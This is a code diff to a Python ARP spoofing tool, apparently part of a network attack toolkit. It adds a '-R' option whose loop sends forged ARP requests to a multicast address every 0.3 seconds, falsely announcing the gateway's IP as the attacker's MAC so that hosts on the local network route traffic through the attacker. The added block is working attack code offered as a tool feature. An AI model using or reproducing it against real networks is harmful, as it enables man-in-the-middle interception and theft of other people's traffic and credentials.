@@ -62,7 +62,8 @@ if __name__ == '__main__':
         parser.add_argument('-t', '--target_ip', help='Set target IP address', default=None)
         parser.add_argument('-m', '--target_mac', help='Set target MAC address', default=None)
         parser.add_argument('-g', '--gateway_ip', help='Set gateway IP address', default=None)
-        parser.add_argument('-r', '--requests', action='store_true', help='Send only ARP requests', default=False)
+        parser.add_argument('-r', '--requests', action='store_true', help='Send only ARP requests')
+        parser.add_argument('-R', '--multicast_requests', action='store_true', help='Send only ARP multicast requests')
         parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output', default=False)
         args = parser.parse_args()
         # endregion
@@ -107,6 +108,23 @@ if __name__ == '__main__':
             base.print_info('Last ip address: ', last_ip_address)
         # endregion
         
+        # region ARP spoofing with Multicast ARP requests
+        if args.multicast_requests:
+            base.print_info('Spoof ARP table: ', gateway_ip_address + ' -> ' + your_mac_address)
+            base.print_info('Send ARP Multicast requests to: 33:33:00:00:00:01')
+            base.print_info('Start ARP spoofing ...')
+            while True:
+                arp_request: bytes = arp.make_request(ethernet_src_mac=your_mac_address,
+                                                      ethernet_dst_mac='33:33:00:00:00:01',
+                                                      sender_mac=your_mac_address,
+                                                      sender_ip=gateway_ip_address,
+                                                      target_mac='00:00:00:00:00:00',
+                                                      target_ip=base.get_random_ip_on_interface(
+                                                          current_network_interface))
+                raw_socket.send(arp_request)
+                sleep(0.3)
+        # endregion
+
         # region Set target
         target_vendor: Union[None, str] = None
 
